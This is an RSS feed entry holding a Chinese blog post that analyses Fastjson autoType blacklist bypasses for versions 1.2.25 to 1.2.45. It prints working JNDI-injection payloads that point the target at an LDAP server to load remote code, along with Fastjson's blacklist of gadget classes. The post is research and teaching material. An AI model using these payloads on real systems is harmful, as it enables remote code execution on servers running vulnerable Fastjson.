<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Fastjson on 一个俗人</title>
        <link>https://gsygsr.github.io/categories/fastjson/</link>
        <description>Recent content in Fastjson on 一个俗人</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>zh-cn</language>
        <copyright>一个俗人</copyright>
        <lastBuildDate>Wed, 08 Jan 2025 14:49:50 +0800</lastBuildDate><atom:link href="https://gsygsr.github.io/categories/fastjson/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>Fastjson各版本绕过分析</title>
        <link>https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/</link>
        <pubDate>Wed, 08 Jan 2025 14:49:50 +0800</pubDate>
        
        <guid>https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/</guid>
        <description>&lt;img src="https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/26.jpg" alt="Featured image of post Fastjson各版本绕过分析" /&gt;&lt;h2 id=&#34;原理&#34;&gt;原理
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;参考博客:&lt;/strong&gt;&lt;a class=&#34;link&#34; href=&#34;https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;&lt;strong&gt;博客&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;看博客分析就是出现了一个&lt;code&gt;checkAutoType&lt;/code&gt;函数,会判断&lt;code&gt;autoTypeSupport&lt;/code&gt;是否为true,由于&lt;code&gt;autoTypeSupport &lt;/code&gt;默认为false,需要通过黑白名单变为true&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bsh
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;com.mchange
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;com.sun.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;java.lang.Thread
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;java.net.Socket
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;java.rmi
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;javax.xml
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;org.apache.bcel
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;org.apache.commons.beanutils
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;org.apache.commons.collections.Transformer
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;org.apache.commons.collections.functors
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;org.apache.commons.collections4.comparators
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;org.apache.commons.fileupload
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;org.apache.myfaces.context.servlet
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;org.apache.tomcat
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;org.apache.wicket.util
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;org.codehaus.groovy.runtime
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;org.hibernate
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;org.jboss
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;org.mozilla.javascript
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;org.python.core
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;org.springframework
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;之前用的就是&lt;/p&gt;
&lt;p&gt;&lt;code&gt;com.sun.rowset.JdbcRowSetImpl&lt;/code&gt;被ban了,没法用了&lt;/p&gt;
&lt;p&gt;试了一下之前的payload会报错&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733224434067-276415d9-e699-4ee3-a38b-041cbb038266.png&#34;
	width=&#34;1116&#34;
	height=&#34;96&#34;
	srcset=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733224434067-276415d9-e699-4ee3-a38b-041cbb038266_hu2bedd81413b4e99b27b1c571015c972d_27934_480x0_resize_box_3.png 480w, https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733224434067-276415d9-e699-4ee3-a38b-041cbb038266_hu2bedd81413b4e99b27b1c571015c972d_27934_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;1162&#34;
		data-flex-basis=&#34;2790px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;autotypesupport&#34;&gt;autoTypeSupport
&lt;/h2&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;autoTypeSupport是&lt;/font&gt;&lt;code&gt;checkAutoType()&lt;/code&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;函数出现后ParserConfig.java中新增的一个配置选项，在&lt;/font&gt;&lt;code&gt;checkAutoType()&lt;/code&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;函数的某些代码逻辑起到开关的作用。&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;默认情况下autoTypeSupport为False，将其设置为True有两种方法：&lt;/font&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;JVM启动参数：&lt;code&gt;-Dfastjson.parser.autoTypeSupport=true&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;代码中设置：&lt;code&gt;ParserConfig.getGlobalInstance().setAutoTypeSupport(true);&lt;/code&gt;，如果有使用非全局ParserConfig则用另外调用&lt;code&gt;setAutoTypeSupport(true);&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;AutoType白名单设置方法：&lt;/font&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;JVM启动参数：&lt;code&gt;-Dfastjson.parser.autoTypeAccept=com.xx.a.,com.yy.&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;代码中设置：&lt;code&gt;ParserConfig.getGlobalInstance().addAccept(&amp;quot;com.xx.a&amp;quot;);&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;通过fastjson.properties文件配置。在1.2.25/1.2.26版本支持通过类路径的fastjson.properties文件来配置，配置方式如下：&lt;code&gt;fastjson.parser.autoTypeAccept=com.taobao.pac.client.sdk.dataobject.,com.cainiao.&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;绕过&#34;&gt;绕过
&lt;/h2&gt;&lt;h3 id=&#34;1225---1241-补丁绕过&#34;&gt;1.2.25 - 1.2.41 补丁绕过
&lt;/h3&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;既然 sun 包里面的这个 &lt;/font&gt;&lt;code&gt;JdbcRowSetImpl&lt;/code&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt; 类被 ban 了，尝试在 &lt;/font&gt;&lt;code&gt;com.sun.rowset.JdbcRowSetImpl&lt;/code&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt; 前面加一个 L，结尾加上 &lt;/font&gt;&lt;code&gt;;&lt;/code&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt; 绕过&lt;/font&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;String payload = &amp;#34;{\&amp;#34;@type\&amp;#34;:\&amp;#34;Lcom.sun.rowset.JdbcRowSetImpl;\&amp;#34;,\&amp;#34;dataSourceName\&amp;#34;:\&amp;#34;ldap://127.0.0.1:8085/SZbYoVCf\&amp;#34;, \&amp;#34;autoCommit\&amp;#34;:true}&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;JSON.parse(payload);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733225882333-7c95a8be-c79b-4dbe-9a9c-3c6985f6f3b0.png&#34;
	width=&#34;1047&#34;
	height=&#34;733&#34;
	srcset=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733225882333-7c95a8be-c79b-4dbe-9a9c-3c6985f6f3b0_hu75a3053d36d8534c7dcc38a4901ed30e_88182_480x0_resize_box_3.png 480w, https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733225882333-7c95a8be-c79b-4dbe-9a9c-3c6985f6f3b0_hu75a3053d36d8534c7dcc38a4901ed30e_88182_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;142&#34;
		data-flex-basis=&#34;342px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;可以绕过&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Lcom.sun.rowset.JdbcRowSetImpl;&lt;/code&gt;这个本身是不存在的类&lt;/p&gt;
&lt;h4 id=&#34;原理解析&#34;&gt;原理解析
&lt;/h4&gt;&lt;p&gt;在&lt;code&gt;ParserConfig.checkAutoType&lt;/code&gt;下断点,调试的时候会进入TypeUtils的loadClass方法&lt;img src=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733226639370-c607b7fc-e838-4d80-916b-61e94b4b52f6.png&#34;
	width=&#34;721&#34;
	height=&#34;77&#34;
	srcset=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733226639370-c607b7fc-e838-4d80-916b-61e94b4b52f6_hu77183335c25599e2b733857383c6eb83_13960_480x0_resize_box_3.png 480w, https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733226639370-c607b7fc-e838-4d80-916b-61e94b4b52f6_hu77183335c25599e2b733857383c6eb83_13960_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;936&#34;
		data-flex-basis=&#34;2247px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;进入loadClass方法能看到绕过的核心&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733226679042-a1e5dcf3-4c45-4ef6-9863-b36055e51dd7.png&#34;
	width=&#34;825&#34;
	height=&#34;159&#34;
	srcset=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733226679042-a1e5dcf3-4c45-4ef6-9863-b36055e51dd7_hu47688eeb4e22c3f0ff11ab5ca85c4067_18107_480x0_resize_box_3.png 480w, https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733226679042-a1e5dcf3-4c45-4ef6-9863-b36055e51dd7_hu47688eeb4e22c3f0ff11ab5ca85c4067_18107_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;518&#34;
		data-flex-basis=&#34;1245px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;如果className是以&lt;code&gt;L&lt;/code&gt;开头,&lt;code&gt;;&lt;/code&gt;结尾的会截取掉开头结尾返回新的newClassName给loadClass&lt;/p&gt;
&lt;h3 id=&#34;1225-1242-补丁绕过&#34;&gt;1.2.25-1.2.42 补丁绕过
&lt;/h3&gt;&lt;p&gt;上面的payload到了1.2.42就不行了&lt;/p&gt;
&lt;p&gt;调试到这里的时候发现传入的&lt;code&gt;Lcom.sun.rowset.JdbcRowSetImpl;&lt;/code&gt;已经开头结尾已经被截取掉了&lt;br&gt;
&lt;img src=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733227358435-23b68757-8cae-4e5f-8faa-a9aff0168cc8.png&#34;
	width=&#34;791&#34;
	height=&#34;532&#34;
	srcset=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733227358435-23b68757-8cae-4e5f-8faa-a9aff0168cc8_hubbeb3de7b617bf8f2e071237860a77c4_69669_480x0_resize_box_3.png 480w, https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733227358435-23b68757-8cae-4e5f-8faa-a9aff0168cc8_hubbeb3de7b617bf8f2e071237860a77c4_69669_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;148&#34;
		data-flex-basis=&#34;356px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;那payload继续双写&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;String payload = &amp;#34;{\&amp;#34;@type\&amp;#34;:\&amp;#34;LLcom.sun.rowset.JdbcRowSetImpl;;\&amp;#34;,\&amp;#34;dataSourceName\&amp;#34;:\&amp;#34;ldap://127.0.0.1:8085/SZbYoVCf\&amp;#34;, \&amp;#34;autoCommit\&amp;#34;:true}&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;JSON.parse(payload);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733227673624-71461dea-8ee4-407d-a243-4c7f38ba4b7f.png&#34;
	width=&#34;1047&#34;
	height=&#34;707&#34;
	srcset=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733227673624-71461dea-8ee4-407d-a243-4c7f38ba4b7f_hu3308956e51c5de1c4fbe491cc05b86f9_67803_480x0_resize_box_3.png 480w, https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733227673624-71461dea-8ee4-407d-a243-4c7f38ba4b7f_hu3308956e51c5de1c4fbe491cc05b86f9_67803_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;148&#34;
		data-flex-basis=&#34;355px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;1225-1243-补丁绕过&#34;&gt;1.2.25-1.2.43 补丁绕过
&lt;/h3&gt;&lt;p&gt;payload&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;String payload = &amp;#34;{\&amp;#34;@type\&amp;#34;:\&amp;#34;[com.sun.rowset.JdbcRowSetImpl\&amp;#34;[{,\&amp;#34;dataSourceName\&amp;#34;:\&amp;#34;ldap://127.0.0.1:8085/SZbYoVCf\&amp;#34;, \&amp;#34;autoCommit\&amp;#34;:true}&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;JSON.parse(payload);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733227907487-53c9d9a7-1f0c-4d5f-a04c-6421616d3057.png&#34;
	width=&#34;636&#34;
	height=&#34;685&#34;
	srcset=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733227907487-53c9d9a7-1f0c-4d5f-a04c-6421616d3057_hu70fa5e78297bd68325232f122f615776_47261_480x0_resize_box_3.png 480w, https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733227907487-53c9d9a7-1f0c-4d5f-a04c-6421616d3057_hu70fa5e78297bd68325232f122f615776_47261_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;92&#34;
		data-flex-basis=&#34;222px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;1225-1245补丁绕过&#34;&gt;1.2.25-1.2.45补丁绕过
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;前提条件：需要目标服务端存在mybatis的jar包，且版本需为3.x.x系列&amp;lt;3.5.0的版本。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;直接给出payload，要连LDAP或RMI都可以：&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;JSON&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&amp;#34;@type&amp;#34;:&amp;#34;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&amp;#34;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&amp;#34;properties&amp;#34;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	{
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&amp;#34;data_source&amp;#34;:&amp;#34;ldap://localhost:1389/Exploit&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;关键PoC：&lt;/font&gt;&lt;code&gt;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;依赖&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;dependency&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;groupId&amp;gt;org.mybatis&amp;lt;/groupId&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;artifactId&amp;gt;mybatis&amp;lt;/artifactId&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;version&amp;gt;3.4.6&amp;lt;/version&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/dependency&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733228502494-dd896c54-bd21-4eea-9b6f-0ea1fb71fb6f.png&#34;
	width=&#34;1075&#34;
	height=&#34;707&#34;
	srcset=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733228502494-dd896c54-bd21-4eea-9b6f-0ea1fb71fb6f_hu784a25314d9731f56225fa64584a4ad3_69973_480x0_resize_box_3.png 480w, https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733228502494-dd896c54-bd21-4eea-9b6f-0ea1fb71fb6f_hu784a25314d9731f56225fa64584a4ad3_69973_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;152&#34;
		data-flex-basis=&#34;364px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&lt;/code&gt;本身绕过黑名单,且&lt;code&gt;setProperties&lt;/code&gt;满足&lt;code&gt;fastjson调用setter&lt;/code&gt;&lt;/p&gt;
